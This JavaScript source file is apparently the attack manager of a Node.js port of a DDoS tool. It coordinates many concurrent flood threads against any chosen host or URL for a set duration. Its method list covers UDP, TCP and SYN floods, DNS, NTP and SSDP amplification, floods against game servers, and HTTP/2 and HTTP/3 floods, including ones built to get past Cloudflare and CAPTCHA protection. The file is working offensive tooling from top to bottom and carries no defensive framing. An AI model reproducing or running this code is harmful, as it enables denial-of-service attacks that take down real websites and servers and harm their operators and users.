import { REQUESTS_SENT, BYTES_SENT } from '../utils/counter.js';
import { Tools } from '../utils/tools.js';
import { logger } from '../utils/logger.js';

// Layer 4 Methods
import {
    UDPFlood,
    TCPFlood,
    MinecraftFlood,
    MinecraftBot,
    SYNFlood,
    VSEFlood,
    TS3Flood,
    MCPEFlood,
    FiveMFlood,
    FiveMTokenFlood,
    CPSFlood,
    ConnectionFlood,
    OVHUDPFlood,
    DNSAmplification,
    NTPAmplification,
    SSDPAmplification
} from '../methods/layer4/index.js';

// Layer 7 Methods
import { 
    HTTPGetFlood, 
    HTTPPostFlood, 
    HTTPSlowAttack 
} from '../methods/layer7/http.js';

import { 
    HTTP2Flood, 
    HTTP2PostFlood, 
    HTTP2CFBypass 
} from '../methods/layer7/http2.js';

import { 
    CloudflareBypass, 
    AdvancedBypass, 
    BotSimulation 
} from '../methods/layer7/bypass.js';

import {
    StressAttack,
    NullAttack,
    DynamicAttack,
    XMLRPCAttack,
    ApacheRangeAttack,
    CookieAttack
} from '../methods/layer7/advanced.js';

import {
    PrivacyPassBypass,
    CaptchaBypass,
    UltimateBypass
} from '../methods/layer7/privacy-captcha.js';

import {
    HTTP3Attack,
    HTTP3PostAttack
} from '../methods/layer7/http3.js';

/**
 * Attack Manager - Coordinates all attack operations
 */
export class AttackManager {
    constructor(options) {
        this.target = options.target;
        this.method = options.method.toUpperCase();
        this.threads = options.threads || 100;
        this.duration = options.duration || 60;
        this.rpc = options.rpc || 1;
        this.proxies = options.proxies || null;
        this.userAgents = options.userAgents || [];
        this.referers = options.referers || [];
        
        this.active = false;
        this.attackThreads = [];
        this.startTime = null;
        this.statsInterval = null;
    }

    /**
     * Start the attack
     */
    async start() {
        try {
            this.active = true;
            this.startTime = Date.now();
            this.autoStopTimeout = null;

            logger.info(`🎯 Starting ${this.method} attack on ${this.target}`);
            logger.info(`⚙️  Threads: ${this.threads}, Duration: ${this.duration}s`);

            // Reset counters
            REQUESTS_SENT.reset();
            BYTES_SENT.reset();

            // Validate method before starting
            const testInstance = this.createAttackInstance();
            if (!testInstance) {
                throw new Error(`Invalid or unsupported method: ${this.method}`);
            }

            // Create attack threads (non-blocking)
            setImmediate(() => {
                try {
                    for (let i = 0; i < this.threads; i++) {
                        try {
                            const attackInstance = this.createAttackInstance();
                            if (attackInstance) {
                                this.attackThreads.push(attackInstance);
                                attackInstance.start().catch(err => {
                                    // Log errors but don't stop attack
                                    logger.debug(`Thread ${i} error: ${err.message}`);
                                });
                            } else {
                                logger.debug(`Failed to create attack instance for thread ${i}`);
                            }
                        } catch (threadErr) {
                            logger.debug(`Error creating thread ${i}: ${threadErr.message}`);
                        }
                    }
                } catch (err) {
                    logger.error(`Error in thread creation loop: ${err.message}`);
                }
            });

            // Start stats monitoring
            this.startStatsMonitoring();

            // Auto-stop after duration
            this.autoStopTimeout = setTimeout(() => {
                try {
                    this.stop();
                } catch (err) {
                    logger.error(`Error in auto-stop: ${err.message}`);
                }
            }, this.duration * 1000);
        } catch (err) {
            logger.error(`Failed to start attack: ${err.message}`);
            this.active = false;
            throw err;
        }
    }

    /**
     * Create attack instance based on method
     */
    createAttackInstance() {
        const method = this.method;

        // Layer 4 Methods
        if (['UDP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new UDPFlood(host, port, this.duration, this.proxies);
        }

        if (['TCP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new TCPFlood(host, port, this.duration, this.proxies);
        }

        if (['MINECRAFT'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new MinecraftFlood(host, port, this.duration, 47, this.proxies);
        }

        if (['MCBOT'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new MinecraftBot(host, port, this.duration, 47, 'MHDDoS_');
        }

        if (['SYN'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new SYNFlood(host, port, this.duration, this.proxies);
        }

        if (['VSE'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new VSEFlood(host, port, this.duration, this.proxies);
        }

        if (['TS3'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new TS3Flood(host, port, this.duration, this.proxies);
        }

        if (['MCPE'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new MCPEFlood(host, port, this.duration, this.proxies);
        }

        if (['FIVEM'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new FiveMFlood(host, port, this.duration, this.proxies);
        }

        if (['FIVEM-TOKEN'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new FiveMTokenFlood(host, port, this.duration, this.proxies);
        }

        if (['CPS'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new CPSFlood(host, port, this.duration, this.proxies);
        }

        if (['CONNECTION'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new ConnectionFlood(host, port, this.duration, this.proxies);
        }

        if (['OVH-UDP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new OVHUDPFlood(host, port, this.duration, this.proxies);
        }

        // Amplification Methods
        if (['DNS-AMP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new DNSAmplification(host, port, this.duration, this.proxies);
        }

        if (['NTP-AMP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new NTPAmplification(host, port, this.duration, this.proxies);
        }

        if (['SSDP-AMP'].includes(method)) {
            const [host, port] = this.parseTarget();
            return new SSDPAmplification(host, port, this.duration);
        }

        // Layer 7 Methods
        if (['GET'].includes(method)) {
            return new HTTPGetFlood(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['POST'].includes(method)) {
            return new HTTPPostFlood(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['SLOW'].includes(method)) {
            return new HTTPSlowAttack(
                this.target, 
                this.duration, 
                this.userAgents, 
                this.proxies
            );
        }

        if (['HTTP2', 'HTTP2-GET'].includes(method)) {
            return new HTTP2Flood(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['HTTP2-POST'].includes(method)) {
            return new HTTP2PostFlood(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['HTTP2-CF', 'CFB'].includes(method)) {
            return new HTTP2CFBypass(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.referers, 
                this.proxies
            );
        }

        if (['BYPASS', 'CFBUAM'].includes(method)) {
            return new AdvancedBypass(
                this.target, 
                this.duration, 
                this.rpc, 
                this.userAgents, 
                this.proxies
            );
        }

        if (['BOT'].includes(method)) {
            return new BotSimulation(
                this.target, 
                this.duration, 
                this.rpc
            );
        }

        if (['STRESS'].includes(method)) {
            return new StressAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['NULL'].includes(method)) {
            return new NullAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['DYN'].includes(method)) {
            return new DynamicAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['XMLRPC'].includes(method)) {
            return new XMLRPCAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['APACHE'].includes(method)) {
            return new ApacheRangeAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['COOKIE'].includes(method)) {
            return new CookieAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['HTTP3', 'HTTP3-GET'].includes(method)) {
            return new HTTP3Attack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['HTTP3-POST'].includes(method)) {
            return new HTTP3PostAttack(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['PRIVACYPASS'].includes(method)) {
            return new PrivacyPassBypass(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
        }

        if (['CAPTCHA'].includes(method)) {
            return new CaptchaBypass(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies,
                {
                    service: '2captcha',
                    apiKey: process.env.CAPTCHA_API_KEY || '',
                    enabled: false
                }
            );
        }

        if (['ULTIMATE', 'ULTIMATE-BYPASS'].includes(method)) {
            return new UltimateBypass(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies,
                {
                    service: '2captcha',
                    apiKey: process.env.CAPTCHA_API_KEY || '',
                    enabled: false
                }
            );
        }

        if (['HEAD'].includes(method)) {
            // HEAD method can use GET flood with method override
            const attack = new HTTPGetFlood(
                this.target,
                this.duration,
                this.rpc,
                this.userAgents,
                this.referers,
                this.proxies
            );
            // Override method in the attack class
            attack.httpMethod = 'HEAD';
            return attack;
        }

        logger.error(`Unknown method: ${method}`);
        return null;
    }

    /**
     * Parse target into host and port
     */
    parseTarget() {
        try {
            if (this.target.includes('://')) {
                const url = new URL(this.target);
                const port = url.port || (url.protocol === 'https:' ? 443 : 80);
                return [url.hostname, parseInt(port)];
            }

            if (this.target.includes(':')) {
                const [host, port] = this.target.split(':');
                const parsedPort = parseInt(port);
                if (isNaN(parsedPort) || parsedPort < 1 || parsedPort > 65535) {
                    throw new Error(`Invalid port number: ${port}`);
                }
                return [host, parsedPort];
            }

            return [this.target, 80];
        } catch (err) {
            logger.error(`Failed to parse target '${this.target}': ${err.message}`);
            throw new Error(`Invalid target format: ${this.target}`);
        }
    }

    /**
     * Start statistics monitoring
     */
    startStatsMonitoring() {
        this.statsInterval = setInterval(() => {
            const elapsed = Math.floor((Date.now() - this.startTime) / 1000);
            const progress = Math.floor((elapsed / this.duration) * 100);

            logger.info(
                `📊 Progress: ${progress}% | ` +
                `Requests: ${Tools.humanFormat(REQUESTS_SENT.get())} | ` +
                `Data: ${Tools.humanBytes(BYTES_SENT.get())} | ` +
                `Time: ${elapsed}s / ${this.duration}s`
            );

            // Don't reset counters - keep accumulating for total stats
        }, 1000);
    }

    /**
     * Stop the attack
     */
    stop() {
        try {
            if (!this.active) return;

            this.active = false;
            logger.info('🛑 Stopping attack...');

            // Clear auto-stop timeout
            if (this.autoStopTimeout) {
                try {
                    clearTimeout(this.autoStopTimeout);
                } catch (err) {
                    logger.debug(`Error clearing timeout: ${err.message}`);
                }
                this.autoStopTimeout = null;
            }

            // Stop all attack threads
            this.attackThreads.forEach((thread, index) => {
                try {
                    if (thread && typeof thread.stop === 'function') {
                        thread.stop();
                    }
                } catch (err) {
                    logger.debug(`Error stopping thread ${index}: ${err.message}`);
                }
            });

            // Clear attack threads array
            this.attackThreads = [];

            // Clear stats interval
            if (this.statsInterval) {
                try {
                    clearInterval(this.statsInterval);
                } catch (err) {
                    logger.debug(`Error clearing stats interval: ${err.message}`);
                }
                this.statsInterval = null;
            }

            // Force garbage collection if available
            if (global.gc) {
                try {
                    global.gc();
                    logger.debug('Garbage collection triggered');
                } catch (e) {
                    logger.debug('GC not available');
                }
            }

            logger.success('✅ Attack stopped successfully!');
            logger.info(`📊 Final Stats - Requests: ${Tools.humanFormat(REQUESTS_SENT.get())} | Data: ${Tools.humanBytes(BYTES_SENT.get())}`);
        } catch (err) {
            logger.error(`Error stopping attack: ${err.message}`);
            // Force cleanup even if there's an error
            this.active = false;
            this.attackThreads = [];
            if (this.statsInterval) {
                clearInterval(this.statsInterval);
                this.statsInterval = null;
            }
            if (this.autoStopTimeout) {
                clearTimeout(this.autoStopTimeout);
                this.autoStopTimeout = null;
            }
        }
    }

    /**
     * Check if attack is active
     */
    isActive() {
        return this.active;
    }

    /**
     * Get current statistics
     */
    getStats() {
        const elapsed = this.startTime 
            ? Math.floor((Date.now() - this.startTime) / 1000)
            : 0;

        return {
            target: this.target,
            method: this.method,
            threads: this.threads,
            duration: this.duration,
            elapsed: elapsed,
            requestsSent: Tools.humanFormat(REQUESTS_SENT.get()),
            bytesSent: Tools.humanBytes(BYTES_SENT.get())
        };
    }
}
